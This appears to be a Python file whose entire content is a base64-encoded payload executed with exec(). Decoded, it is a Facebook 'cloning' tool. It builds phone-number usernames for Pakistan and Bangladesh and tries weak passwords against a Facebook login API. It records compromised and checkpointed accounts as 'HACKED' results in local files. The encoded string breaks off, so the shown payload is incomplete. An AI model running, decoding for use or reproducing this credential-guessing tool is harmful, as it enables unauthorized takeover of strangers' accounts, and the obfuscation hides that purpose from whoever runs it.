import base64
exec(base64.b64decode("IyB1bmNvbXB5bGU2IHZlcnNpb24gMy43LjQNCg0KIyBQeXRob24gYnl0ZWNvZGUgMi43DQoNCiMgRGVjb21waWxlZCBmcm9tOiBQeXRob24gMi43LjE4IChkZWZhdWx0LCBNYXIgMjAgMjAyMSwgMTQ6NTk6MzMpIA0KDQojIFtHQ0MgNC4yLjEgQ29tcGF0aWJsZSBBbmRyb2lkICg2NDU0NzczIGJhc2VkIG9uIHIzNjU2MzFjMikgQ2xhbmcgOS4wLjggKGh0dHBzOi8NCg0KIyBFbWJlZGRlZCBmaWxlIG5hbWU6IGtvTnRvbA0KDQppbXBvcnQgb3MsIHN5cywgdGltZSwgZGF0ZXRpbWUsIHJhbmRvbSwgaGFzaGxpYiwgcmUsIHRocmVhZGluZywganNvbiwgdXJsbGliLCBjb29raWVsaWIsIGdldHBhc3MNCg0Kb3Muc3lzdGVtKCdybSAtcmYgLnR4dCcpDQoNCmZvciBuIGluIHJhbmdlKDEwMDApOg0KDQogICAgbm1iciA9IHJhbmRvbS5yYW5kaW50KDExMTExMTEsIDk5OTk5OTkpDQoNCiAgICBzeXMuc3Rkb3V0ID0gb3BlbignLnR4dCcsICdhJykNCg0KICAgIHByaW50IG5tYnINCg0KICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KDQp0cnk6DQoNCiAgICBpbXBvcnQgcmVxdWVzdHMNCg0KZXhjZXB0IEltcG9ydEVycm9yOg0KDQogICAgb3Muc3lzdGVtKCdwaXAyIGluc3RhbGwgbWVjaGFuaXplJykNCg0KdHJ5Og0KDQogICAgaW1wb3J0IG1lY2hhbml6ZQ0KDQpleGNlcHQgSW1wb3J0RXJyb3I6DQoNCiAgICBvcy5zeXN0ZW0oJ3BpcDIgaW5zdGFsbCByZXF1ZXN0JykNCg0KICAgIHRpbWUuc2xlZXAoMSkNCg0KICAgIG9zLnN5c3RlbSgnVGhlbiB0eXBlOiBweXRob24yIHN0YXIucHknKQ0KDQppbXBvcnQgb3MsIHN5cywgdGltZSwgZGF0ZXRpbWUsIHJhbmRvbSwgaGFzaGxpYiwgcmUsIHRocmVhZGluZywganNvbiwgdXJsbGliLCBjb29raWVsaWIsIHJlcXVlc3RzLCBtZWNoYW5pemUNCg0KZnJvbSBtdWx0aXByb2Nlc3NpbmcucG9vbCBpbXBvcnQgVGhyZWFkUG9vbA0KDQpmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcg0KDQpmcm9tIG1lY2hhbml6ZSBpbXBvcnQgQnJvd3Nlcg0KDQpyZWxvYWQoc3lzKQ0KDQpzeXMuc2V0ZGVmYXVsdGVuY29kaW5nKCd1dGY4JykNCg0KYnIgPSBtZWNoYW5pemUuQnJvd3NlcigpDQoNCmJyLnNldF9oYW5kbGVfcm9ib3RzKEZhbHNlKQ0KDQpici5zZXRfaGFuZGxlX3JlZnJlc2gobWVjaGFuaXplLl9odHRwLkhUVFBSZWZyZXNoUHJvY2Vzc29yKCksIG1heF90aW1lPTEpDQoNCmJyLmFkZGhlYWRlcnMgPSBbKCdVc2VyLUFnZW50JywgJ09wZXJhLzkuODAgKEFuZHJvaWQ7IE9wZXJhIE1pbmkvMzIuMC4yMjU0Lzg1LiBVOyBpZCkgUHJlc3RvLzIuMTIuNDIzIFZlcnNpb24vMTIuMTYnKV0NCg0KYnIuYWRkaGVhZGVycyA9IFsoJ3VzZXItYWdlbnQnLCAnRGFsdmlrLzEuNi4wIChMaW51eDsgVTsgQW5kcm9pZCA0LjQuMjsgTlg1NSBCdWlsZC9LT1Q1NTA2KSBbRkJBTi9GQjRBO0ZCQVYvMTA2LjAuMC4yNi42ODtGQkJWLzQ1OTA0MTYwO0ZCRE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTE5MjB9O0ZCTEMvaXRfSVQ7RkJSVi80NTkwNDE2MDtGQkNSL1Bvc3RlTW9iaWxlO0ZCTUYvYXN1cztGQkJEL2FzdXM7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvQVNVU19aMDBBRDtGQlNWLzUuMDtGQk9QLzE7RkJDQS94ODY6YXJtZWFiaS12N2E7XScpXQ0KDQpkZWYgYWNhayhiKToNCg0KICAgIHcgPSAnYWh0ZHpqYycNCg0KICAgIGQgPSAnJw0KDQogICAgZm9yIGkgaW4geDoNCg0KICAgICAgICBkICs9ICchJyArIHdbcmFuZG9tLnJhbmRpbnQoMCwgbGVuKHcpIC0gMSldICsgaQ0KDQogICAgcmV0dXJuIGNldGFrKGQpDQoNCmRlZiBjZXRhayhiKToNCg0KICAgIHcgPSAnYWh0ZHpqYycNCg0KICAgIGZvciBpIGluIHc6DQoNCiAgICAgICAgaiA9IHcuaW5kZXgoaSkNCg0KICAgICAgICB4ID0geC5yZXBsYWNlKCchJXMnICUgaSwgJ1x4MWJbJXM7MW0nICUgc3RyKDMxICsgaikpDQoNCiAgICB4ICs9ICdceDFiWzBtJw0KDQogICAgeCA9IHgucmVwbGFjZSgnITAnLCAnXHgxYlswbScpDQoNCiAgICBzeXMuc3Rkb3V0LndyaXRlKHggKyAnXG4nKQ0KDQpkZWYgamFsYW4oeik6DQoNCiAgICBmb3IgZSBpbiB6ICsgJ1xuJzoNCg0KICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGUpDQoNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQoNCiAgICAgICAgdGltZS5zbGVlcCgzLjAgLyAyMDApDQoNCmRlZiB0aWsoKToNCg0KICAgIHRpdGlrID0gWycgICAnLCAnLiAgJywgJy4uICcsICcuLi4nLCAnLi4gJywgJy4gICcsICcgICAnXQ0KDQogICAgZm9yIG8gaW4gdGl0aWs6DQoNCiAgICAgICAgcHJpbnQgJ1xyXHgxYlsxOzkxbSAgICAgW1x4ZTJceDk3XHg4Zl0gXHgxYlsxOzkybUxvYVx4MWJbMTs5MG1kaW5nIFx4MWJbMTs5N20nICsgbywNCg0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCg0KICAgICAgICB0aW1lLnNsZWVwKDAuNSkNCg0KYmFjayA9IDANCg0Kb2tzID0gW10NCg0KaWQgPSBbXQ0KDQpjcGIgPSBbXQ0KDQp2dWxub3QgPSAnXHgxYlszMW1Ob3QgVnVsbicNCg0KdnVsbiA9ICdceDFiWzMybVZ1bG4nDQoNCm9zLnN5c3RlbSgnY2xlYXInKQ0KDQpsb2dvMSA9ICcgXG4gICAgICAgXHgxYlsxMDFtXHgxYlszNzsxbUNPREVEIEJZIEFMRlUtS0lOR1x4MWJbMG1cbiAgICAgICBceDFiWzEwMW1ceDFiWzM3OzFtICBTVEFZIEFXQVkgRlJPTSBNRSAgXHgxYlswbVxuXHgxYlsxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG5ceDFiWzA7MzFtXHhlMlx4OGJceDlmXHgxYlswOzMybSBERVZPTFBFUiAgIDogXHgxYlswOzMxbSBBTEZVIE1FRVIgXG5ceDFiWzA7MzFtXHhlMlx4OGJceDlmIFx4MWJbMDszMm1XSEFUU0FBUCAgIDogIFx4MWJbMDszMW0wMTQwODQ3OTIwNCBcblx4MWJbMDszMW1ceGUyXHg4Ylx4OWYgXHgxYlswOzMybUpJR0VSUyAgIDogIFx4MWJbMDszMW1BTEZFICsgU0FOTllJSVxuXHgxYlsxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJw0KDQpkZWYgbGlzZW5zaSgpOg0KDQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQoNCiAgICBsb2dpbigpDQoNCmRlZiBsb2dpbigpOg0KDQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQoNCiAgICBwcmludCBsb2dvMQ0KDQogICAgcHJpbnQNCg0KICAgIHByaW50ICdceDFiWzE7OTdtKDEpIFBha2lzdGFuIENsb25pbmcnDQoNCiAgICBwcmludCAnXHgxYlsxOzk3bSgyKSBCYW5nbGFkZXNoIENsb25pbmcnDQoNCiAgICBwcmludCAnXHgxYlsxOzk3bSgwKSBCYWNrJw0KDQogICAgcGlsaWhfU29taSgpDQoNCmRlZiBwaWxpaF9Tb21pKCk6DQoNCiAgICBTb21pID0gcmF3X2lucHV0KCdcblx4MWJbMTs5NW1ceGUyXHg4MFx4YTJceGUyXHg5ZVx4YTIgXHgxYlsxOzk2bScpDQoNCiAgICBpZiBTb21pID09ICcnOg0KDQogICAgICAgIHByaW50ICdceDFiWzE7OTdtRmlsbCBJbiBDb3JyZWN0bHknDQoNCiAgICAgICAgcGlsaWhfbG9naW4oKQ0KDQogICAgZWxpZiBTb21pID09ICcxJzoNCg0KICAgICAgICBwKCkNCg0KICAgIGVsaWYgU29taSA9PSAnMic6DQoNCiAgICAgICAgYigpDQoNCmRlZiBwKCk6DQoNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCg0KICAgIHByaW50IGxvZ28xDQoNCiAgICBwcmludA0KDQogICAgcHJpbnQNCg0KICAgIHByaW50ICdEbyB5b3Ugd2FudCBjb3VudGludWUgW3kvbl0nDQoNCiAgICBhY3QoKQ0KDQpkZWYgYWN0KCk6DQoNCiAgICBzb21pID0gcmF3X2lucHV0KCdcblxuIFx4MWJbMTs5N20gICcpDQoNCiAgICBpZiBzb21pID09ICcnOg0KDQogICAgICAgIHByaW50ICdbIV0gRmlsbCBpbiBjb3JyZWN0bHknDQoNCiAgICAgICAgYWN0KCkNCg0KICAgIGVsaWYgc29taSA9PSAneSc6DQoNCiAgICAgICAgdGlrKCkNCg0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCg0KICAgICAgICBwcmludCBsb2dvMQ0KDQogICAgICAgIHByaW50DQoNCiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5M21TRUxFQ1QgU0lNIENPREUnDQoNCiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5Mm0wMCwwMSwwMiwwMywwNCwwNSwwNiwwNywwOCwwOScNCg0KICAgICAgICBwcmludCAnXHgxYlsxOzkybTExLDEyLDEzLDE0LDE1LDE2LDE3LDE4Jw0KDQogICAgICAgIHByaW50ICdceDFiWzE7OTJtMjEsMjIsMjMsMjQnDQoNCiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5Mm0zMCwzMSwzMiwzMywzNCwzNSwzNicNCg0KICAgICAgICBwcmludCAnXHgxYlsxOzkybTQwLDQxLDQyLDQzLDQ0LDQ1LDQ2LDQ3LDQ4LDQ5Jw0KDQogICAgICAgIHByaW50DQoNCiAgICAgICAgdHJ5Og0KDQogICAgICAgICAgICBjID0gcmF3X2lucHV0KCc+Pj4gJykNCg0KICAgICAgICAgICAgayA9ICcwMycNCg0KICAgICAgICAgICAgaWRsaXN0ID0gJy50eHQnDQoNCiAgICAgICAgICAgIGZvciBsaW5lIGluIG9wZW4oaWRsaXN0LCAncicpLnJlYWRsaW5lcygpOg0KDQogICAgICAgICAgICAgICAgaWQuYXBwZW5kKGxpbmUuc3RyaXAoKSkNCg0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCg0KICAgICAgICAgICAgcHJpbnQgJ1shXSBGaWxlIE5vdCBGb3VuZCcNCg0KICAgICAgICAgICAgcmF3X2lucHV0KCdcblsgQmFjayBdJykNCg0KICAgICAgICAgICAgc29taSgpDQoNCiAgICBlbGlmIHNvbWkgPT0gJ24nOg0KDQogICAgICAgIGxvZ2luKCkNCg0KICAgIGVsc2U6DQoNCiAgICAgICAgcHJpbnQgJ1shXSBGaWxsIEluIENvcnJlY3RseScNCg0KICAgICAgICBhY3Rpb24oKQ0KDQogICAgcHJpbnQgNDcgKiAnXHgxYlsxOzkzbS0nDQoNCiAgICB4eHggPSBzdHIobGVuKGlkKSkNCg0KICAgIGphbGFuKCdceDFiWzE7OTZtIFRPVEFMIElEUyBOVU1CRVIgOiAnICsgeHh4KQ0KDQogICAgamFsYW4oJ1x4MWJbMTs5M20gVE8gU1RPUCBUSElTIFBST0NFU1MgUFJFU1MgQ3RybCBUSEVOIHonKQ0KDQogICAgcHJpbnQgNDcgKiAnXHgxYlsxOzkzbS0nDQoNCiAgICBkZWYgbWFpbihhcmcpOg0KDQogICAgICAgIGdsb2JhbCBjcGINCg0KICAgICAgICBnbG9iYWwgb2tzDQoNCiAgICAgICAgdXNlciA9IGFyZw0KDQogICAgICAgIHRyeToNCg0KICAgICAgICAgICAgb3MubWtkaXIoJ3NhdmUnKQ0KDQogICAgICAgIGV4Y2VwdCBPU0Vycm9yOg0KDQogICAgICAgICAgICBwYXNzDQoNCiAgICAgICAgdHJ5Og0KDQogICAgICAgICAgICBwYXNzMSA9IHVzZXINCg0KICAgICAgICAgICAgZGF0YSA9IGJyLm9wZW4oJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MSZlbWFpbD0nICsgayArIGMgKyB1c2VyICsgJyZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9JyArIHBhc3MxICsgJyZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OGZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmbScpDQoNCiAgICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkNCg0KICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcToNCg0KICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTNtICAgKEhBQ1x4MWJbMTs5Mm1LRUQpXHgxYlsxOzkxbSBceGUyXHg5N1x4OGYgIFx4MWJbMTs5N20nICsgayArIGMgKyB1c2VyICsgJ1x4MWJbMTs5MW0gXHhlMlx4OTdceDhmIFx4MWJbMTs5NW0nICsgcGFzczENCg0KICAgICAgICAgICAgICAgIG9rYiA9IG9wZW4oJ3NkY2FyZC9pZHMvc3VjY2Vzc2Z1bC50eHQnLCAnYScpDQoNCiAgICAgICAgICAgICAgICBva2Iud3JpdGUoayArIGMgKyB1c2VyICsgcGFzczEgKyAnXG4nKQ0KDQogICAgICAgICAgICAgICAgb2tiLmNsb3NlKCkNCg0KICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQoYyArIHVzZXIgKyBwYXNzMSkNCg0KICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3JfbXNnJ106DQoNCiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybSAgIChDaGVja1x4MWJbMTs5N21wb2ludFx4MWJbMTs5M20pXHgxYlsxOzkxbSBceGUyXHg5N1x4OGYgXHgxYlsxOzk3bScgKyBrICsgYyArIHVzZXIgKyAnXHgxYlsxOzkxbSBceGUyXHg5N1x4OGYgXHgxYlsxOzk2bSAnICsgcGFzczENCg0KICAgICAgICAgICAgICAgIGNwcyA9IG9wZW4oJ3NkY2FyZC9pZHMvY2hlY2twb2ludC50eHQnLCAnYScpDQoNCiAgICAgICAgICAgICAgICBjcHMud3JpdGUoayArIGMgKyB1c2VyICsgcGFzczEgKyAnXG4nKQ0KDQogICAgICAgICAgICAgICAgY3BzLmNsb3NlKCkNCg0KICAgICAgICAgICAgICAgIGNwYi5hcHBlbmQoYyArIHVzZXIgKyBwYXNzMSkNCg0KICAgICAgICAgICAgZWxzZToNCg0KICAgICAgICAgICAgICAgIHBhc3MyID0gayArIGMgKyB1c2VyDQoNCiAgICAgICAgICAgICAgICBkYXRhID0gYnIub3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0xJmVtYWlsPScgKyBrICsgYyArIHVzZXIgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcGFzczIgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk4ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWZtJykNCg0KICAgICAgICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkNCg0KICAgICAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQoNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5M20gICAoSEFDXHgxYlsxOzkybUtFRClceDFiWzE7OTFtIFx4ZTJceDk3XHg4ZiAgXHgxYlsxOzk3bScgKyBrICsgYyArIHVzZXIgKyAnXHgxYlsxOzkxbSBceGUyXHg5N1x4OGYgXHgxYlsxOzk1bScgKyBwYXNzMg0KDQogICAgICAgICAgICAgICAgICAgIG9rYiA9IG9wZW4oJ3NkY2FyZC9pZHMvc3VjY2Vzc2Z1bC50eHQnLCAnYScpDQoNCiAgICAgICAgICAgICAgICAgICAgb2tiLndyaXRlKGsgKyBjICsgdXNlciArIHBhc3MyICsgJ1xuJykNCg0KICAgICAgICAgICAgICAgICAgICBva2IuY2xvc2UoKQ0KDQogICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQoYyArIHVzZXIgKyBwYXNzMikNCg0KICAgICAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yX21zZyddOg0KDQogICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTJtICAgKENoZWNrXHgxYlsxOzk3bXBvaW50XHgxYlsxOzkzbSlceDFiWzE7OTFtIFx4ZTJceDk3XHg4ZiBceDFiWzE7OTdtJyArIGsgKyBjICsgdXNlciArICdceDFiWzE7OTFtIFx4ZTJceDk3XHg4ZiBceDFiWzE7OTZtICcgKyBwYXNzMg0KDQogICAgICAgICAgICAgICAgICAgIGNwcyA9IG9wZW4oJ3NkY2FyZC9pZHMvY2hlY2twb2ludC50eHQnLCAnYScpDQoNCiAgICAgICAgICAgICAgICAgICAgY3BzLndyaXRlKGsgKyBjICsgdXNlciArIHBhc3MzICsgJ1xuJykNCg0KICAgICAgICAgICAgICAgICAgICBjcHMuY2xvc2UoKQ0KDQogICAgICAgICAgICAgICAgICAgIGNwYi5hcHBlbmQoYyArIHVzZXIgKyBwYXNzMykNCg0KICAgICAgICAgICAgICAgIGVsc2U6DQoNCiAgICAgICAgICAgICAgICAgICAgcGFzczMgPSAnQEAxMjNAQCcNCg0KICAgICAgICAgICAgICAgICAgICBkYXRhID0gYnIub3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0xJmVtYWlsPScgKyBrICsgYyArIHVzZXIgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcGFzczMgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk4ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWZtJykNCg0KICAgICAgICAgICAgICAgICAgICBxID0ganNvbi5sb2FkKGRhdGEpDQoNCiAgICAgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcToNCg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5M20gICAoSEFDXHgxYlsxOzkybUtFRClceDFiWzE7OTFtIFx4ZTJceDk3XHg4ZiAgXHgxYlsxOzk3bScgKyBrICsgYyArIHVzZXIgKyAnXHgxYlsxOzkxbSBceGUyXHg5N1x4OGYgXHgxYlsxOzk1bScgKyBwYXNzMw0KDQogICAgICAgICAgICAgICAgICAgICAgICBva2IgPSBvcGVuKCdzZGNhcmQvaWRzL3N1Y2Nlc3NmdWwudHh0JywgJ2EnKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBva2Iud3JpdGUoayArIGMgKyB1c2VyICsgcGFzczMgKyAnXG4nKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBva2IuY2xvc2UoKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKGMgKyB1c2VyICsgcGFzczMpDQoNCiAgICAgICAgICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3JfbXNnJ106DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTJtICAgKENoZWNrXHgxYlsxOzk3bXBvaW50XHgxYlsxOzkzbSlceDFiWzE7OTFtIFx4ZTJceDk3XHg4ZiBceDFiWzE7OTdtJyArIGsgKyBjICsgdXNlciArICdceDFiWzE7OTFtIFx4ZTJceDk3XHg4ZiBceDFiWzE7OTZtICcgKyBwYXNzMw0KDQogICAgICAgICAgICAgICAgICAgICAgICBjcHMgPSBvcGVuKCdzZGNhcmQvaWRzL2NoZWNrcG9pbnQudHh0JywgJ2EnKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBjcHMud3JpdGUoayArIGMgKyB1c2VyICsgcGFzczMgKyAnXG4nKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBjcHMuY2xvc2UoKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBjcGIuYXBwZW5kKGMgKyB1c2VyICsgcGFzczMpDQoNCiAgICAgICAgZXhjZXB0Og0KDQogICAgICAgICAgICBwYXNzDQoNCiAgICBwID0gVGhyZWFkUG9vbCgzMCkNCg0KICAgIHAubWFwKG1haW4sIGlkKQ0KDQogICAgcHJpbnQgNTAgKiAnXHgxYlsxOzkxbS0nDQoNCiAgICBwcmludCAnUHJvY2VzcyBIYXMgQmVlbiBDb21wbGV0ZWQgLi4uJw0KDQogICAgcmF3X2lucHV0KCdcblx4MWJbMTs5Mm1bXHgxYlsxOzkybUJhY2tceDFiWzE7OTVtXScpDQoNCiAgICBsb2dpbigpDQoNCmRlZiBiKCk6DQoNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCg0KICAgIHByaW50IGxvZ28xDQoNCiAgICBwcmludA0KDQogICAgcHJpbnQNCg0KICAgIHByaW50ICdEbyB5b3Ugd2FudCBjb3VudGludWUgW3kvbl0nDQoNCiAgICBhY3Rpb24oKQ0KDQpkZWYgYWN0aW9uKCk6DQoNCiAgICBzb21pID0gcmF3X2lucHV0KCdcblxuIFx4MWJbMTs5N20gICcpDQoNCiAgICBpZiBzb21pID09ICcnOg0KDQogICAgICAgIHByaW50ICdbIV0gRmlsbCBpbiBjb3JyZWN0bHknDQoNCiAgICAgICAgYWN0aW9uKCkNCg0KICAgIGVsaWYgc29taSA9PSAneSc6DQoNCiAgICAgICAgdGlrKCkNCg0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCg0KICAgICAgICBwcmludCBsb2dvMQ0KDQogICAgICAgIHByaW50DQoNCiAgICAgICAgdHJ5Og0KDQogICAgICAgICAgICBjID0gcmF3X2lucHV0KCdUWVBFIEFOWSAzIERJR0lUIE5VTUJFUiBcblxuICAgICBceDFiWzE7OTRtXHgxYlsxOzk2bVxuMTc1LDE2NSwxOTEsIDE5MiwgMTkzLCAxOTQsXG4xOTUsIDE5NiwgMTk3LCAxOTgsIDE5OTpcbiA+Pj4gJykNCg0KICAgICAgICAgICAgayA9ICcrODgwJw0KDQogICAgICAgICAgICBpZGxpc3QgPSAnLnR4dCcNCg0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3BlbihpZGxpc3QsICdyJykucmVhZGxpbmVzKCk6DQoNCiAgICAgICAgICAgICAgICBpZC5hcHBlbmQobGluZS5zdHJpcCgpKQ0KDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KDQogICAgICAgICAgICBwcmludCAnWyFdIEZpbGUgTm90IEZvdW5kJw0KDQogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQ0KDQogICAgICAgICAgICBzb21pKCkNCg0KICAgIGVsaWYgc29taSA9PSAnbic6DQoNCiAgICAgICAgbG9naW4oKQ0KDQogICAgZWxzZToNCg0KICAgICAgICBwcmludCAnWyFdIEZpbGwgSW4gQ29ycmVjdGx5Jw0KDQogICAgICAgIGFjdGlvbigpDQoNCiAgICBwcmludCA0NyAqICdceDFiWzE7OTNtLScNCg0KICAgIHh4eCA9IHN0cihsZW4oaWQpKQ0KDQogICAgamFsYW4oJ1x4MWJbMTs5Nm0gVE9UQUwgSURTIE5VTUJFUiA6ICcgKyB4eHgpDQoNCiAgICBqYWxhbignXHgxYlsxOzkzbSBUTyBTVE9QIFRISVMgUFJPQ0VTUyBQUkVTUyBDdHJsIFRIRU4geicpDQoNCiAgICBwcmludCA0NyAqICdceDFiWzE7OTNtLScNCg0KICAgIGRlZiBtYWluKGFyZyk6DQoNCiAgICAgICAgdXNlciA9IGFyZw0KDQogICAgICAgIHRyeToNCg0KICAgICAgICAgICAgb3MubWtkaXIoJ3NhdmUnKQ0KDQogICAgICAgIGV4Y2VwdCBPU0Vycm9yOg0KDQogICAgICAgICAgICBwYXNzDQoNCiAgICAgICAgdHJ5Og0KDQogICAgICAgICAgICBwYXNzMSA9IHVzZXINCg0KICAgICAgICAgICAgZGF0YSA9IGJyLm9wZW4oJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MSZlbWFpbD0nICsgayArIGMgKyB1c2VyICsgJyZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9JyArIHBhc3MxICsgJyZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OGZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmbScpDQoNCiAgICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkNCg0KICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcToNCg0KICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTNtICAgKEhBQ1x4MWJbMTs5Mm1LRUQpXHgxYlsxOzkxbSBceGUyXHg5N1x4OGYgIFx4MWJbMTs5N20nICsgayArIGMgKyB1c2VyICsgJ1x4MWJbMTs5MW0gXHhlMlx4OTdceDhmIFx4MWJbMTs5NW0nICsgcGFzczENCg0KICAgICAgICAgICAgICAgIG9rYiA9IG9wZW4oJ3NkY2FyZC9pZHMvc3VjY2Vzc2Z1bC50eHQnLCAnYScpDQoNCiAgICAgICAgICAgICAgICBva2Iud3JpdGUoayArIGMgKyB1c2VyICsgcGFzczEgKyAnXG4nKQ0KDQogICAgICAgICAgICAgICAgb2tiLmNsb3NlKCkNCg0KICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQoYyArIHVzZXIgKyBwYXNzMSkNCg0KICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3JfbXNnJ106DQoNCiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybSAgIChDaGVja1x4MWJbMTs5N21wb2ludFx4MWJbMTs5M20pXHgxYlsxOzkxbSBceGUyXHg5N1x4OGYgXHgxYlsxOzk3bScgKyBrICsgYyArIHVzZXIgKyAnXHgxYlsxOzkxbSBceGUyXHg5N1x4OGYgXHgxYlsxOzk2bSAnICsgcGFzczENCg0KICAgICAgICAgICAgICAgIGNwcyA9IG9wZW4oJ3NkY2FyZC9pZHMvY2hlY2twb2ludC50eHQnLCAnYScpDQoNCiAgICAgICAgICAgICAgICBjcHMud3JpdGUoayArIGMgKyB1c2VyICsgcGFzczEgKyAnXG4nKQ0KDQogICAgICAgICAgICAgICAgY3BzLmNsb3NlKCkNCg0KICAgICAgICAgICAgICAgIGNwYi5hcHBlbmQoYyArIHVzZXIgKyBwYXNzMSkNCg0KICAgICAgICAgICAgZWxzZToNCg0KICAgICAgICAgICAgICAgIHBhc3MyID0gJ2JhbmdsYWRlc2gnDQoNCiAgICAgICAgICAgICAgICBkYXRhID0gYnIub3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0xJmVtYWlsPScgKyBrICsgYyArIHVzZXIgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcGFzczIgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk4ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWZtJykNCg0KICAgICAgICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkNCg0KICAgICAgICAgICAgICAgIGlmICdhY2N